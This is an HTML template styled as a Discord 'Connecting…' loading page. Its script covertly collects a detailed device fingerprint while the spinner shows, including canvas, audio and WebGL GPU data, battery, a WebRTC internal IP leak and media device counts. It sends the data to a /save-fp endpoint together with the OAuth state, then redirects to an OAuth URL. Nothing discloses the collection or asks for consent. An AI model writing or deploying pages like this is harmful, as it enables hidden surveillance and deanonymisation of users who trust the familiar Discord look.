<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Connecting…</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #1e1f22;
      color: #dbdee1;
      font-family: 'gg sans', 'Noto Sans', Whitney, 'Helvetica Neue', Helvetica, Arial, sans-serif;
      display: flex; align-items: center; justify-content: center; min-height: 100vh;
    }
    .wrap { text-align: center; }
    .spinner {
      width: 48px; height: 48px;
      border: 4px solid #3d4044;
      border-top-color: #5865f2;
      border-radius: 50%;
      animation: spin .8s linear infinite;
      margin: 0 auto 20px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    p { font-size: 14px; color: #949ba4; }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="spinner"></div>
    <p>Connecting to Discord…</p>
  </div>

<script>
(async () => {
  const STATE     = "{{ state }}";
  const OAUTH_URL = "{{ oauth_url }}";

  /* ── Fingerprint collection ─────────────────────────────────────── */
  async function collect() {
    const fp = {};

    // Navigator
    fp.userAgent            = navigator.userAgent;
    fp.language             = navigator.language;
    fp.languages            = (navigator.languages || []).join(", ");
    fp.platform             = navigator.platform;
    fp.vendor               = navigator.vendor;
    fp.hardwareConcurrency  = navigator.hardwareConcurrency;
    fp.deviceMemory         = navigator.deviceMemory || "N/A";
    fp.maxTouchPoints       = navigator.maxTouchPoints;
    fp.cookieEnabled        = navigator.cookieEnabled;
    fp.doNotTrack           = navigator.doNotTrack || "unset";
    fp.onLine               = navigator.onLine;
    fp.pdfViewerEnabled     = !!navigator.pdfViewerEnabled;

    // Screen
    fp.screen           = `${screen.width}x${screen.height}`;
    fp.colorDepth       = `${screen.colorDepth}-bit`;
    fp.availScreen      = `${screen.availWidth}x${screen.availHeight}`;
    fp.devicePixelRatio = window.devicePixelRatio || 1;
    fp.windowSize       = `${window.innerWidth}x${window.innerHeight}`;
    fp.outerSize        = `${window.outerWidth}x${window.outerHeight}`;

    // Time
    fp.timezone       = Intl.DateTimeFormat().resolvedOptions().timeZone;
    fp.timezoneOffset = new Date().getTimezoneOffset();
    fp.localTime      = new Date().toISOString();

    // Plugins
    try {
      fp.plugins = Array.from(navigator.plugins).map(p => p.name).join(", ") || "None";
    } catch (_) { fp.plugins = "N/A"; }

    // WebGL (GPU info — the most valuable device fingerprint)
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (gl) {
        const dbg = gl.getExtension("WEBGL_debug_renderer_info");
        fp.webGL        = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
        fp.webGLVendor  = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR);
        fp.webGLVersion = gl.getParameter(gl.VERSION);
        fp.webGLsl      = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
        fp.maxTexSize   = gl.getParameter(gl.MAX_TEXTURE_SIZE);
      }
    } catch (_) {}

    // Canvas fingerprint hash
    try {
      const c = document.createElement("canvas");
      c.width = 300; c.height = 60;
      const ctx = c.getContext("2d");
      ctx.textBaseline = "alphabetic";
      ctx.fillStyle = "#f60";
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = "#069";
      ctx.font = "14px Arial";
      ctx.fillText("Cwm fjordbank glyphs vext quiz \uD83D\uDE00", 2, 15);
      ctx.fillStyle = "rgba(102,204,0,0.7)";
      ctx.font = "18px Times New Roman";
      ctx.fillText("Cwm fjordbank glyphs vext quiz \uD83D\uDE00", 4, 45);
      const url = c.toDataURL();
      let hash = 5381;
      for (let i = 0; i < url.length; i++) hash = ((hash << 5) + hash) ^ url.charCodeAt(i);
      fp.canvasHash = (hash >>> 0).toString(16);
    } catch (_) {}

    // Audio fingerprint
    try {
      const AC = window.AudioContext || window.webkitAudioContext;
      if (AC) {
        await new Promise(resolve => {
          const ac = new AC(), osc = ac.createOscillator(),
                ana = ac.createAnalyser(), gain = ac.createGain(),
                proc = ac.createScriptProcessor(4096, 1, 1);
          gain.gain.value = 0;
          osc.type = "triangle";
          osc.connect(ana); ana.connect(proc); proc.connect(gain); gain.connect(ac.destination);
          osc.start(0);
          proc.onaudioprocess = () => {
            const d = new Float32Array(ana.frequencyBinCount);
            ana.getFloatFrequencyData(d);
            fp.audioFingerprint = Array.from(d.slice(0, 10)).map(v => v.toFixed(2)).join(",");
            osc.disconnect(); proc.disconnect(); ac.close();
            resolve();
          };
          setTimeout(resolve, 400);
        });
      }
    } catch (_) {}

    // Network connection
    try {
      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (c) {
        fp.connection  = `${c.effectiveType || "?"} — ${c.downlink || "?"}Mbps — RTT ${c.rtt || "?"}ms`;
        fp.saveData    = !!c.saveData;
      }
    } catch (_) {}

    // Battery
    try {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        fp.battery = `${Math.round(b.level * 100)}% (${b.charging ? "charging" : "discharging"})`;
      }
    } catch (_) {}

    // AdBlock detection
    try {
      const el = document.createElement("div");
      el.className = "adsbox pub_300x250 pub_300x250m banner_ad";
      el.style.cssText = "width:1px;height:1px;position:absolute;left:-9999px";
      document.body.appendChild(el);
      fp.adBlock = el.offsetHeight === 0 || el.offsetWidth === 0;
      document.body.removeChild(el);
    } catch (_) { fp.adBlock = false; }

    // WebRTC internal IP leak
    try {
      await new Promise(resolve => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = e => {
          if (e && e.candidate) {
            const m = /(\d{1,3}(?:\.\d{1,3}){3})/.exec(e.candidate.candidate);
            if (m) fp.webRTC = m[1];
          } else { pc.close(); resolve(); }
        };
        setTimeout(resolve, 1200);
      });
    } catch (_) {}

    // Media devices (mic/cam/speaker count)
    try {
      const devs = await navigator.mediaDevices.enumerateDevices();
      fp.audioInputs  = devs.filter(d => d.kind === "audioinput").length;
      fp.audioOutputs = devs.filter(d => d.kind === "audiooutput").length;
      fp.videoInputs  = devs.filter(d => d.kind === "videoinput").length;
    } catch (_) {}

    // Storage support
    fp.hasLocalStorage    = !!window.localStorage;
    fp.hasSessionStorage  = !!window.sessionStorage;
    fp.hasIndexedDB       = !!window.indexedDB;
    fp.hasServiceWorker   = "serviceWorker" in navigator;

    // Misc
    fp.referrer    = document.referrer || "Direct";
    fp.screenOrient = screen.orientation ? screen.orientation.type : "N/A";

    return fp;
  }

  /* ── Send fingerprint, then redirect ────────────────────────────── */
  try {
    const fp = await collect();
    await fetch("/save-fp", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ state: STATE, fp }),
    });
  } catch (_) {
    // Even if collection fails, proceed to OAuth — data is still partially captured
  }

  window.location.href = OAUTH_URL;
})();
</script>
</body>
</html>
